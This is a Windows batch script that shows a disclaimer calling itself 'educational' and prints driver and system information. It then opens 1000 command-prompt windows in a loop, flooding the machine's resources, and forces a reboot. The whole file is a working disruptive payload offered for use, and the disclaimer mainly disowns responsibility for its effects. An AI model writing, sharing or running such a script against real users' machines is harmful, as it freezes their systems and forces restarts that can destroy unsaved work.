@echo OFF
echo x=msgbox("All files here are to be used for educational purposes only. Use all files as is; any modifications in any way immediatly deem them as no longer our responsibility. Any lawful action taken against individuals or an organization from use/distribution of these files is not our responsibility regardless of files edits or lack thereof (after posted publish date)." ,16, "WARNING") >> msgbox.vbs
start msgbox.vbs
echo Do you want to continue? If not please close this window. 
pause
CLS
echo It is %date%? If not please close this window.
pause
CLS
RD
CLS
DRIVERQUERY
timeout /t 5 /nobreak
CLS
SYSTEMINFO
timeout /t 5 /nobreak
CLS
set loopcount=1000
:loop
START cmd.exe
set /a loopcount=loopcount-1
if %loopcount%==0 goto exitloop
goto loop
:exitloop
timeout /t 10 /nobreak
SHUTDOWN -r -t 10

